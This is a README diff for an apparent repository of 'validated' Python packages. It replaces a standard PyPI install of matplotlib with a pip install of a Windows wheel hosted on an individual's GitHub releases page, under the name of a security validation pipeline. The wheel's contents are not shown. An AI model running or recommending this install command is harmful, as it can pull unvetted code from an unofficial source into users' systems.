@@ -5,7 +5,7 @@ This repository contains Python packages that have been validated through our co
 ## ðŸ“¦ Available Packages
 | Package | Version | Validation Date | Quick Install |
 |---------|---------|-----------------|---------------|
-| `matplotlib` | `3.9.4` | 08.11.25 | `pip install matplotlib==3.9.4` |
+| `matplotlib` | `3.10.5` | 08.12.25 | `pip install https://github.com/bdousa/pythonFeedWindows/releases/download/matplotlib-v3.10.5/matplotlib-3.10.5-cp313-cp313-win_amd64.whl` |
 
 ## ðŸš€ Usage Instructions
 ### Option 1: Browse and Download
@@ -41,5 +41,5 @@ To request validation of a new package:
 3. **Approval Process**: Packages typically validated within 3 business days
 
 ---
-*Last updated: 08.11.25 22:22 UTC*
+*Last updated: 08.12.25 10:22 UTC*
 *Powered by Azure DevOps Security Pipeline*
